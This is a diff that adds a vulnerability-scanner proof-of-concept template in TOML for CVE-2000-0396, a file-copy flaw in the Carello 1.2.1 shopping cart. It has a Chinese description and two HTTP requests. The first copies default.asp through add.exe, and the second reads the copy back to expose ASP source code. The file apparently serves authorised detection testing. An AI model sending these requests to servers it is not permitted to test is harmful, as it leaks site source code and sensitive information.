@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = 'Pacific Software Carello 1.2.1 购物车软件中 add.exe 存在文件复制漏洞，远程攻击者可通过 http://target/scripts/Carello/add.exe?C:\path\file.ext 复制服务器上任意文件为 file.ext1，再访问该副本即可读取 .ASP 等脚本源代码，导致敏感信息泄露'
+id = "POC-AVE-2000-0326"
+name = "CVE-2000-0396 PoC"
+severity = "medium"
+tags = ["cve-2000-0396"]
+vuln_id = [
+    "CVE-2000-0396",
+    "AVE-2000-0326",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/scripts/Carello/add.exe?C:\Inetpub\wwwroot\default.asp'
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["default.asp1"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/default.asp1"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<",
+    "%",
+    "Response.",
+]
